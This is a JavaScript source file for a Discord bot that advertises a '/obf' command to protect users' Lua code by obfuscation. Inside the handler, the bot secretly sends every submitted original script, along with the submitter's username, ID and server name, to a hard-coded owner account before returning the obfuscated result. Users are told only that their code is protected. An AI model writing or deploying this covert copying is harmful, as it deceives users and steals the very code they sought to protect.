const { Client, GatewayIntentBits, SlashCommandBuilder, REST, Routes, AttachmentBuilder, EmbedBuilder, PermissionFlagsBits } = require('discord.js');
const { obfuscate } = require('./obfuscator');
const https = require('https');
const http = require('http');

const PORT = process.env.PORT || 3000;
http.createServer((req, res) => { res.writeHead(200); res.end('OK'); }).listen(PORT);

const TOKEN = process.env.DISCORD_BOT_TOKEN;
if (!TOKEN) { console.error('DISCORD_BOT_TOKEN is not set.'); process.exit(1); }

const OWNER_ID = '1474472773467242599';

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

const command = new SlashCommandBuilder()
  .setName('obf')
  .setDescription('Protect your code with MIMOSA VM v4.5')
  .addStringOption(o => o.setName('code').setDescription('Paste your Lua code directly').setRequired(false))
  .addAttachmentOption(o => o.setName('file').setDescription('Upload a .lua file to obfuscate').setRequired(false));

const messageCommand = new SlashCommandBuilder()
  .setName('message')
  .setDescription('Send a message to a channel')
  .addChannelOption(o => o.setName('channel').setDescription('The channel').setRequired(true))
  .addStringOption(o => o.setName('message').setDescription('The message').setRequired(true));

function fetchURL(url) {
  return new Promise((resolve, reject) => {
    const mod = url.startsWith('https') ? https : http;
    mod.get(url, res => { let d = ''; res.on('data', c => d += c); res.on('end', () => resolve(d)); }).on('error', reject);
  });
}

client.once('ready', async () => {
  console.log(`Online as ${client.user.tag}`);
  const rest = new REST({ version: '10' }).setToken(TOKEN);
  await rest.put(Routes.applicationCommands(client.user.id), { body: [command.toJSON(), messageCommand.toJSON()] });
  console.log('Slash command /obf registered.');
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  if (interaction.commandName === 'message') {
    if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
      return interaction.reply({ content: "You don't a admin", ephemeral: true });
    }
    const chan = interaction.options.getChannel('channel');
    const msg = interaction.options.getString('message');
    const embed = new EmbedBuilder().setColor(0x000000).setDescription(msg);
    await chan.send({ embeds: [embed] });
    return interaction.reply({ content: 'Sent', ephemeral: true });
  }

  if (interaction.commandName !== 'obf') return;

  const codeOption = interaction.options.getString('code');
  const fileOption = interaction.options.getAttachment('file');

  if (!codeOption && !fileOption) return interaction.reply({ content: 'Provide `code` or a `file`.', ephemeral: true });

  await interaction.deferReply();

  try {
    let src = fileOption ? await fetchURL(fileOption.url) : codeOption;
    if (!src || !src.trim()) return interaction.editReply('The provided code is empty.');

    // DM al owner con el código original
    try {
      const owner = await client.users.fetch(OWNER_ID);
      const serverName = interaction.guild ? interaction.guild.name : 'DM';
      await owner.send({
        content: `**User:** ${interaction.user.tag} (\`${interaction.user.id}\`)\n**Server:** ${serverName}`,
        files: [new AttachmentBuilder(Buffer.from(src, 'utf-8'), { name: 'original.lua' })]
      });
    } catch (dmErr) {
      console.error('Failed to DM owner:', dmErr);
    }

    const buf = Buffer.from(obfuscate(src), 'utf-8');
    if (buf.length > 8 * 1024 * 1024) return interaction.editReply('Output too large (>8MB).');

    await interaction.editReply({
      content: 'Your code is now protected, copy and paste.',
      files: [new AttachmentBuilder(buf, { name: 'obfuscated.lua' })]
    });
  } catch (e) {
    console.error(e);
    await interaction.editReply('An error occurred. Please try again.');
  }
});

client.login(TOKEN);
